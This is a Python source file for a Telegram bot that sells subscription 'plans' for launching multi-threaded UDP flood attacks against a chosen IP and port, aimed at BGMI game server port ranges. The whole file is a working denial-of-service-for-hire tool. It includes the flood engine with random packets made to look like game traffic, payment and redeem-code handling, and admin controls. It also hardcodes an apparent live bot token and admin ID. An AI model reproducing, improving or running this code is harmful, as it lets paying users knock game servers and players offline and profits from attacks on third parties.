import os
import sys
import time
import json
import random
import struct
import socket
import threading
import sqlite3
import asyncio
import hashlib
from datetime import datetime, timedelta
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ===== CONFIG =====
BOT_TOKEN = "8845156942:AAFuPASERxEEdzjh4TlneY_Lg9p-0z1J600"
ADMIN_ID = 7420837327
ADMIN_USERNAME = "@ayan_vip_admin"
COOLDOWN = 60
MAX_DURATION = 300
DB_PATH = "users.db"

# ===== BGMI UDP PORTS (Complete List) =====
BGMI_PORTS = []
# Main game ports
for p in range(7000, 8000): BGMI_PORTS.append(p)
for p in range(10000, 10100): BGMI_PORTS.append(p)
for p in range(20000, 20100): BGMI_PORTS.append(p)
for p in range(24000, 24100): BGMI_PORTS.append(p)
for p in range(30000, 30300): BGMI_PORTS.append(p)
for p in range(41000, 41200): BGMI_PORTS.append(p)
# Extra ports
extra = [8011, 9030, 10491, 10612, 11455, 12235, 13748, 13894, 13972, 17000, 17500]
for p in extra: BGMI_PORTS.append(p)
BGMI_PORTS = list(set(BGMI_PORTS))  # Remove duplicates

# ===== DATABASE =====
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  plan TEXT DEFAULT 'none',
                  expiry TEXT DEFAULT 'none',
                  attacks INTEGER DEFAULT 0,
                  last_attack REAL DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS codes
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  code TEXT UNIQUE,
                  days INTEGER,
                  used INTEGER DEFAULT 0,
                  used_by INTEGER DEFAULT 0,
                  used_at TEXT)''')
    # Add admin
    c.execute("INSERT OR IGNORE INTO users (user_id, plan, expiry) VALUES (?, 'lifetime', ?)",
              (ADMIN_ID, (datetime.now() + timedelta(days=36500)).isoformat()))
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    if not user:
        c.execute("INSERT INTO users (user_id, plan, expiry) VALUES (?, 'none', 'none')", (user_id,))
        conn.commit()
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = c.fetchone()
    conn.close()
    return {"id": user[0], "plan": user[1], "expiry": user[2], "attacks": user[3], "last_attack": user[4]}

def update_user(user_id, **kw):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    for k, v in kw.items():
        c.execute(f"UPDATE users SET {k} = ? WHERE user_id = ?", (v, user_id))
    conn.commit()
    conn.close()

def all_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id, plan, expiry, attacks FROM users WHERE user_id != ?", (ADMIN_ID,))
    users = c.fetchall()
    conn.close()
    return users

# ===== ATTACK ENGINE =====
attacks = {}
stop_events = {}

def udp_flood(target_ip, target_port, duration, stop_event):
    """Single thread flood worker"""
    sent = 0
    start = time.monotonic()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(1)

        while not stop_event.is_set():
            elapsed = time.monotonic() - start
            if elapsed >= duration:
                break

            # Create random payload (looks like game packet)
            payload = bytes([random.randint(0,255) for _ in range(random.randint(64, 256))])

            # Send to random BGMI port
            port = random.choice(BGMI_PORTS[:30])  # Top 30 ports
            try:
                sock.sendto(payload, (target_ip, port))
                sent += 1
            except:
                pass

            # Also send to the specific target port
            if random.random() < 0.3:  # 30% chance
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    sent += 1
                except:
                    pass

            # Small delay to save user internet
            time.sleep(random.uniform(0.001, 0.005))

            # Periodic longer pause
            if sent % 100 == 0:
                time.sleep(0.03)

    except:
        pass
    finally:
        try: sock.close()
        except: pass
    return sent

def start_attack(user_id, ip, port, duration):
    """Start multi-threaded UDP flood"""
    stop_event = threading.Event()
    stop_events[user_id] = stop_event

    threads = []
    # 50 threads total - 30 for random ports, 20 for target port
    for i in range(50):
        t = threading.Thread(target=lambda: udp_flood(ip, port, duration, stop_event), daemon=True)
        t.start()
        threads.append(t)

    attacks[user_id] = {
        "ip": ip, "port": port, "duration": duration,
        "start": time.monotonic(), "threads": threads,
        "stop": stop_event
    }
    return stop_event

def stop_attack(user_id):
    if user_id in stop_events and stop_events[user_id]:
        stop_events[user_id].set()
        attacks[user_id] = None
        return True
    return False

# ===== BOT HANDLERS =====

async def start(update, context):
    uid = update.effective_user.id
    user = get_user(uid)

    if uid == ADMIN_ID:
        msg = (
            "👑 *ADMIN PANEL v9.0* 👑\n\n"
            f"ID: `{uid}`\n"
            "Plan: *LIFETIME (ADMIN)*\n\n"
            "*USER COMMANDS:*\n"
            "`/attack <ip:port> <sec>` - Start attack\n"
            "`/stop` - Stop attack\n"
            "`/myplan` - Your plan\n"
            "`/plans` - Buy plan\n"
            "`/redeem <code>` - Activate\n\n"
            "*ADMIN COMMANDS:*\n"
            "`/add <id> <days>` - Add plan\n"
            "`/remove <id>` - Remove plan\n"
            "`/users` - All users\n"
            "`/broadcast <msg>` - Message all\n"
            "`/stats` - Bot stats\n"
            "`/stopall` - Stop all attacks\n"
            "`/gencode <days>` - Generate code"
        )
    else:
        p = user['plan'].upper() if user['plan'] != 'none' else 'NO PLAN'
        e = user['expiry'][:10] if user['expiry'] != 'none' else 'N/A'
        msg = (
            "⚔️ *BGMI BOT v9.0* ⚔️\n\n"
            f"👤 ID: `{uid}`\n"
            f"📋 Plan: *{p}*\n"
            f"⏳ Expiry: `{e}`\n"
            f"📊 Attacks: `{user['attacks']}`\n\n"
            "*COMMANDS:*\n"
            "`/attack <ip:port> <sec>` - Start attack (10-300s)\n"
            "`/stop` - Stop attack\n"
            "`/myplan` - Check plan\n"
            "`/plans` - Buy plan\n"
            "`/redeem <code>` - Activate code\n\n"
            f"📱 Contact: {ADMIN_USERNAME}"
        )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def attack_cmd(update, context):
    uid = update.effective_user.id
    user = get_user(uid)

    # Check plan
    if user['plan'] == 'none':
        await update.message.reply_text(
            f"❌ *No plan!*\nBuy from /plans\nContact: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return

    # Check expiry
    if user['expiry'] != 'none':
        try:
            exp = datetime.fromisoformat(user['expiry'])
            if datetime.now() > exp:
                update_user(uid, plan='none', expiry='none')
                await update.message.reply_text("❌ *Plan expired!* Contact admin.", parse_mode='Markdown')
                return
        except:
            pass

    # Parse args
    if len(context.args) < 2:
        await update.message.reply_text(
            "❌ Usage: `/attack 1.2.3.4:20010 120`\n(10-300 seconds)",
            parse_mode='Markdown'
        )
        return

    try:
        target = context.args[0]
        duration = int(context.args[1])

        if ':' in target:
            ip, port = target.split(':')
            port = int(port)
        else:
            ip = target
            port = 20010

        socket.inet_aton(ip)  # validate

        if duration < 10:
            await update.message.reply_text("❌ Minimum 10 seconds.", parse_mode='Markdown')
            return
        if duration > MAX_DURATION:
            await update.message.reply_text(f"❌ Max {MAX_DURATION} seconds.", parse_mode='Markdown')
            return

        # Check active attack
        if uid in attacks and attacks[uid]:
            await update.message.reply_text("⚠️ Attack already running! Use /stop.", parse_mode='Markdown')
            return

        # Check cooldown
        if uid != ADMIN_ID:
            cd = COOLDOWN - (time.time() - user['last_attack'])
            if cd > 0:
                await update.message.reply_text(f"⏳ Cooldown: {int(cd)}s", parse_mode='Markdown')
                return

        # Start attack
        stop_event = start_attack(uid, ip, port, duration)
        update_user(uid, attacks=user['attacks'] + 1, last_attack=time.time())

        await update.message.reply_text(
            f"🔥 *ATTACK LAUNCHED!* 🔥\n\n"
            f"🎯 `{ip}:{port}`\n"
            f"⏱ `{duration}s`\n"
            f"📡 Multi-port UDP flood\n"
            f"🔢 `{len(BGMI_PORTS)}` ports\n\n"
            "Use /stop to halt\n"
            f"⏳ Auto-stop in {duration}s",
            parse_mode='Markdown'
        )

        # Monitor
        async def monitor():
            start_t = time.monotonic()
            while not stop_event.is_set():
                if time.monotonic() - start_t >= duration:
                    stop_event.set()
                    attacks[uid] = None
                    await update.message.reply_text(
                        "✅ *ATTACK COMPLETE!*\n"
                        f"🎯 `{ip}:{port}`\n"
                        f"⏱ `{duration}s`\n"
                        "⏳ Cooldown: 60s",
                        parse_mode='Markdown'
                    )
                    break
                await asyncio.sleep(0.5)

        asyncio.create_task(monitor())

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", parse_mode='Markdown')

async def stop_cmd(update, context):
    uid = update.effective_user.id
    if uid == ADMIN_ID and context.args:
        try:
            tid = int(context.args[0])
            if stop_attack(tid):
                await update.message.reply_text(f"🛑 Stopped user `{tid}`", parse_mode='Markdown')
                return
        except:
            pass

    if stop_attack(uid):
        await update.message.reply_text("🛑 *Attack stopped!*", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ No active attack.", parse_mode='Markdown')

async def myplan_cmd(update, context):
    uid = update.effective_user.id
    user = get_user(uid)
    if user['plan'] == 'none':
        msg = f"❌ *No Plan*\n👤 `{uid}`\nContact: {ADMIN_USERNAME}"
    else:
        e = user['expiry'][:10] if user['expiry'] != 'none' else 'Lifetime'
        msg = (f"📋 *Your Plan*\n\n👤 `{uid}`\n📋 *{user['plan'].upper()}*\n"
               f"⏳ Expires: `{e}`\n📊 Attacks: `{user['attacks']}`")
    await update.message.reply_text(msg, parse_mode='Markdown')

async def plans_cmd(update, context):
    keyboard = [
        [InlineKeyboardButton("📅 7 Days - ₹199", callback_data="p7")],
        [InlineKeyboardButton("📅 15 Days - ₹349", callback_data="p15")],
        [InlineKeyboardButton("📅 30 Days - ₹599", callback_data="p30")],
        [InlineKeyboardButton("📅 60 Days - ₹999", callback_data="p60")],
        [InlineKeyboardButton("👑 365 Days - ₹2499", callback_data="p365")],
    ]
    await update.message.reply_text(
        "💰 *PLANS*\n\n"
        "📅 7 Days - ₹199\n"
        "📅 15 Days - ₹349\n"
        "📅 30 Days - ₹599\n"
        "📅 60 Days - ₹999\n"
        "👑 365 Days - ₹2499\n\n"
        "✅ Max 300s attacks\n"
        "✅ Multi-port flood\n"
        "✅ No internet slowdown\n\n"
        f"Pay UPI: `bgmi@upi`\n"
        f"Contact: {ADMIN_USERNAME}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button(update, context):
    q = update.callback_query
    await q.answer()
    days = q.data[1:]
    prices = {"7": "₹199", "15": "₹349", "30": "₹599", "60": "₹999", "365": "₹2499"}
    await q.edit_message_text(
        f"📌 *{days} Days Plan*\n💵 {prices.get(days, 'N/A')}\n\n"
        f"Pay UPI: `bgmi@upi`\nSend screenshot to {ADMIN_USERNAME}\n"
        "Use `/redeem CODE` to activate.",
        parse_mode='Markdown'
    )

async def redeem_cmd(update, context):
    uid = update.effective_user.id
    if not context.args:
        await update.message.reply_text("❌ Usage: `/redeem CODE`", parse_mode='Markdown')
        return
    code = context.args[0].strip().upper()

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM codes WHERE code = ? AND used = 0", (code,))
    data = c.fetchone()
    if data:
        cid, cstr, days, used, by, at = data
        exp = (datetime.now() + timedelta(days=days)).isoformat()
        plan = f"{days}days"
        update_user(uid, plan=plan, expiry=exp)
        c.execute("UPDATE codes SET used=1, used_by=?, used_at=? WHERE code=?",
                  (uid, datetime.now().isoformat(), code))
        conn.commit()
        conn.close()
        await update.message.reply_text(
            f"✅ *ACTIVATED!*\n📋 *{days} Days*\n⏳ Exp: `{exp[:10]}`\nUse /attack now!",
            parse_mode='Markdown'
        )
    else:
        conn.close()
        await update.message.reply_text(f"❌ Invalid code! Contact {ADMIN_USERNAME}", parse_mode='Markdown')

# ===== ADMIN COMMANDS =====

async def admin_add(update, context):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!", parse_mode='Markdown')
        return
    if len(context.args) < 2:
        await update.message.reply_text("❌ `/add <id> <days>`", parse_mode='Markdown')
        return
    try:
        tid = int(context.args[0])
        days = int(context.args[1])
        plan = f"{days}days"
        exp = (datetime.now() + timedelta(days=days)).isoformat()
        update_user(tid, plan=plan, expiry=exp)
        await update.message.reply_text(
            f"✅ Added `{days}` days to `{tid}`\nExpires: `{exp[:10]}`",
            parse_mode='Markdown'
        )
        try:
            await context.bot.send_message(tid,
                f"✅ *Plan Activated!*\n📋 *{days} Days*\n⏳ Exp: `{exp[:10]}`\nUse /attack!",
                parse_mode='Markdown')
        except:
            pass
    except:
        await update.message.reply_text("❌ Invalid input.", parse_mode='Markdown')

async def admin_remove(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text("❌ `/remove <id>`", parse_mode='Markdown')
        return
    try:
        tid = int(context.args[0])
        update_user(tid, plan='none', expiry='none')
        stop_attack(tid)
        await update.message.reply_text(f"✅ Removed `{tid}`", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid ID.", parse_mode='Markdown')

async def admin_users(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    users = all_users()
    if not users:
        await update.message.reply_text("No users.", parse_mode='Markdown')
        return
    msg = f"📊 *USERS ({len(users)})*\n\n"
    for uid, plan, exp, atk in users:
        p = plan.upper() if plan != 'none' else 'NO PLAN'
        e = exp[:10] if exp != 'none' else 'N/A'
        msg += f"👤 `{uid}` | *{p}* | `{e}` | Attacks: `{atk}`\n"
    if len(msg) > 4000:
        for i in range(0, len(msg), 4000):
            await update.message.reply_text(msg[i:i+4000], parse_mode='Markdown')
    else:
        await update.message.reply_text(msg, parse_mode='Markdown')

async def admin_broadcast(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text("❌ `/broadcast <msg>`", parse_mode='Markdown')
        return
    msg = ' '.join(context.args)
    users = all_users()
    s, f = 0, 0
    for uid, _, _, _ in users:
        try:
            await context.bot.send_message(uid, f"📢 *ADMIN*\n\n{msg}", parse_mode='Markdown')
            s += 1
        except:
            f += 1
    await update.message.reply_text(f"✅ Sent: `{s}`\n❌ Failed: `{f}`", parse_mode='Markdown')

async def admin_stats(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE plan != 'none' AND user_id != ?", (ADMIN_ID,))
    active = c.fetchone()[0]
    c.execute("SELECT plan, COUNT(*) FROM users WHERE user_id != ? GROUP BY plan", (ADMIN_ID,))
    plans = c.fetchall()
    c.execute("SELECT SUM(attacks) FROM users")
    total_atk = c.fetchone()[0] or 0
    conn.close()
    msg = f"📊 *STATS*\n👥 Total: `{total}`\n✅ Active: `{active}`\n📦 Attacks: `{total_atk}`\n\n*Plans:*\n"
    for p, c in plans:
        msg += f"• *{p.upper()}*: `{c}`\n"
    msg += f"\n⚡ Max: {MAX_DURATION}s\n⏳ Cooldown: {COOLDOWN}s\n🔢 Ports: {len(BGMI_PORTS)}"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def admin_stopall(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    c = 0
    for uid in list(stop_events.keys()):
        if stop_attack(uid):
            c += 1
    await update.message.reply_text(f"🛑 Stopped `{c}` attacks.", parse_mode='Markdown')

async def admin_gencode(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text("❌ `/gencode <days>`", parse_mode='Markdown')
        return
    try:
        days = int(context.args[0])
        raw = f"BGMI{days}{random.randint(1000,9999)}{time.time()}"
        code = hashlib.md5(raw.encode()).hexdigest()[:12].upper()
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO codes (code, days) VALUES (?, ?)", (code, days))
        conn.commit()
        conn.close()
        await update.message.reply_text(
            f"✅ *Code Generated*\n📌 `{code}`\n⏳ `{days}` days\nUser: `/redeem {code}`",
            parse_mode='Markdown'
        )
    except:
        await update.message.reply_text("❌ Invalid days.", parse_mode='Markdown')

# ===== FLASK =====
flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return "BGMI v9.0 RUNNING ✅"

def run_flask():
    flask_app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)

# ===== MAIN =====
def main():
    init_db()
    threading.Thread(target=run_flask, daemon=True).start()

    app = Application.builder().token(BOT_TOKEN).build()

    # User commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("myplan", myplan_cmd))
    app.add_handler(CommandHandler("plans", plans_cmd))
    app.add_handler(CommandHandler("redeem", redeem_cmd))

    # Admin commands
    app.add_handler(CommandHandler("add", admin_add))
    app.add_handler(CommandHandler("remove", admin_remove))
    app.add_handler(CommandHandler("users", admin_users))
    app.add_handler(CommandHandler("broadcast", admin_broadcast))
    app.add_handler(CommandHandler("stats", admin_stats))
    app.add_handler(CommandHandler("stopall", admin_stopall))
    app.add_handler(CommandHandler("gencode", admin_gencode))

    # Callback
    app.add_handler(CallbackQueryHandler(button))

    print("🤖 BGMI BOT v9.0 ONLINE!")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"⚡ Max Duration: {MAX_DURATION}s")
    print(f"⏳ Cooldown: {COOLDOWN}s")
    print(f"🔢 Ports: {len(BGMI_PORTS)}")

    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()